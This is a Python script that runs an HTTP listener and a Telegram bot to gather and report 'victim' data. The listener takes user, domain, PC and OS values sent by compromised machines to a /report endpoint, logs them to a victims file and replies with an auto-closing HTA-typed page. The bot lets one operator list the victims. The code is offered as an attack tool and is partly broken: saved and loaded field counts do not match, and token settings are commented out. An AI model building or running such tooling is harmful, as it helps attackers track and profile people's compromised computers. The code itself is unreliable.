from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import socket
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import threading

# --- Config ---
#TELEGRAM_TOKEN = xxxx         # Replace with your bot token
#AUTHORIZED_USER_ID = xxxx      # Replace with your Telegram ID
DATA_FILE = "/home/bot/victims.txt"  # Path to save victim data

victims = []  # Global list to hold victim data

# --- Helper functions ---

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Unable to determine IP"

def save_victim(victim):
    with open(DATA_FILE, "a") as f:
        line = f"{victim['User']},{victim['Domain']},{victim['PC']},{victim['OS']}\n"
        f.write(line)

# --- HTTP Server ---
class ReportHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)

        if parsed_url.path == "/report":
            params = parse_qs(parsed_url.query)
            print(f"Parsed params: {params}")

            victim = {
                "User": params.get("user", [""])[0],
                "Domain": params.get("domain", [""])[0],
                "PC": params.get("pc", [""])[0],
                "OS": params.get("os", [""])[0]
            }

            victims.append(victim)
            save_victim(victim)
            print(f"Added victim: {victim}")

            # HTML with JS to auto-close the window
            html = """
            <html>
              <head>
                <script>
                  window.onload = function() {
                    window.close();
                  };
                </script>
              </head>
              <body></body>
            </html>
            """

            self.send_response(200)
            self.send_header("Content-Type", "application/hta")  # signal it's a script
            self.send_header("Content-Length", str(len(html.encode())))
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(html.encode())

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found.")

    def log_message(self, format, *args):
        return


def run_http_server():
    server_address = ("0.0.0.0", 8080)
    httpd = HTTPServer(server_address, ReportHandler)
    print("HTTP server running on port 8080...")
    httpd.serve_forever()

# --- Telegram Bot Commands ---

async def ip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("Unauthorized.")
        return

    ip = get_ip()
    await update.message.reply_text(f"My local IP address is: {ip}")

async def victims_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        await update.message.reply_text("Unauthorized.")
        return

    if not victims:
        await update.message.reply_text("No victims recorded yet.")
        return

    lines = []
    for i, v in enumerate(victims, 1):
        line = f"{i}. User: {v['User']}, Domain: {v['Domain']}, PC: {v['PC']}, OS: {v['OS']}, Date: {v['Date']}"
        lines.append(line)

    message = "\n".join(lines)
    for chunk in [message[i:i+4000] for i in range(0, len(message), 4000)]:
        await update.message.reply_text(chunk)

# --- Main Logic ---

def load_victims():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            for line in f:
                parts = line.strip().split(",")
                if len(parts) == 5:
                    victim = {
                        "User": parts[0],
                        "Domain": parts[1],
                        "PC": parts[2],
                        "OS": parts[3],
                        "Date": parts[4]
                    }
                    victims.append(victim)

def main():
    load_victims()

    # Start HTTP server in background thread
    server_thread = threading.Thread(target=run_http_server, daemon=True)
    server_thread.start()

    # Start Telegram bot
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("ip", ip_command))
    app.add_handler(CommandHandler("victims", victims_command))
    print("Telegram bot started. Listening for commands...")
    app.run_polling()
